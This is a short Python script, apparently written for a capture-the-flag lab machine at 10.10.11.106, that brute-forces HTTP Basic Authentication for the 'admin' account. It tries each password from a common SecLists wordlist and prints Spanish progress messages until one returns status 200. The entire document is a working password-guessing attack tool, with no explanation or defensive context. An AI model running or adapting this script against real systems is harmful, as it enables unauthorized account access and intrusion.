#!/usr/bin/python3 

from pwn import *
import requests

bar = log.progress("")
counter = 1

target = "http://10.10.11.106/"

with open("/usr/share/seclists/Passwords/Common-Credentials/best1050.txt", "r") as file:
    for line in file:
        password = line.strip()
        bar.status(f"Probando contraseña [{counter}/1049]:{password}")
        request = requests.get(target, auth=("admin", password))
        counter += 1 

        if request.status_code == 200:
            bar.success(f"La contraseña {password} es valida")
            exit(0)

